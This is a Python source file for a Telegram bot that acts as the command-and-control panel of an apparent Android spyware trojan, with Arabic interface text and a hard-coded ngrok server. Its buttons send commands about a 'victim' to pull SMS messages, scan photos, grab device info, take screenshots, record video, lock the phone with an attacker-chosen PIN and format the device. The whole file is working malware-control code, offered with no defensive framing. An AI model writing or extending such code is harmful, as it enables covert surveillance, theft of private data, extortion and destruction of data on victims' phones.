#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Direct Control
"""
import os, json, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

# ⚠️ رابط السيرفر
SERVER_URL = "https://dec4-2001-16a4-2f8-adf9-ac8c-c4f.ngrok-free.app"

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ASK_PIN, ASK_NOTIFY = 1, 2
current_victim = None

def send_command(action, params=None):
    """إرسال أمر إلى السيرفر"""
    try:
        res = requests.post(f"{SERVER_URL}/command", json={
            "victimId": "target",
            "action": action,
            "params": params or {}
        })
        return res.json()
    except Exception as e:
        return {"status": "error", "message": str(e)}

def ckbd():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 فحص الصور", callback_data='scan_photos'),
         InlineKeyboardButton("📋 معلومات الجهاز", callback_data='get_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو 10ث", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'),
         InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("💬 سحب SMS", callback_data='get_sms')],
        [InlineKeyboardButton("🔔 إشعار", callback_data='send_notify'),
         InlineKeyboardButton("🔒 قفل", callback_data='set_pin')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ Ph4nt0m C2", reply_markup=ckbd())

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data

    if d == 'set_pin':
        await q.edit_message_text("🔢 أرسل PIN (4 أرقام):")
        return ASK_PIN
    if d == 'send_notify':
        await q.edit_message_text("🔔 أرسل نص الإشعار:")
        return ASK_NOTIFY

    if d in ('scan_photos', 'get_info', 'get_sms'):
        result = send_command(d)
        await q.edit_message_text(f"✅ تم: {d}\n{result}", reply_markup=ckbd())
    elif d in ('vibrate', 'play_sound', 'screenshot', 'record_video', 'flash_on', 'flash_off', 'format'):
        result = send_command(d)
        await q.edit_message_text(f"✅ تم: {d}\n{result}", reply_markup=ckbd())
    else:
        await q.edit_message_text("اختر أمر:", reply_markup=ckbd())

async def pin_input(update, context):
    pin = update.message.text.strip()
    if len(pin)!=4 or not pin.isdigit():
        await update.message.reply_text("❌ 4 أرقام:")
        return ASK_PIN
    send_command('lock_screen', {'pin': pin})
    await update.message.reply_text(f"🔒 تم: {pin}")
    return ConversationHandler.END

async def notify_input(update, context):
    msg = update.message.text.strip()
    if not msg:
        await update.message.reply_text("❌ نص:")
        return ASK_NOTIFY
    send_command('send_notification', {'message': msg})
    await update.message.reply_text(f"🔔 تم: {msg}")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle, pattern='^set_pin$'), CallbackQueryHandler(handle, pattern='^send_notify$')],
        states={ASK_PIN:[MessageHandler(filters.TEXT & ~filters.COMMAND, pin_input)], ASK_NOTIFY:[MessageHandler(filters.TEXT & ~filters.COMMAND, notify_input)]},
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    app.add_handler(conv)
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    main()
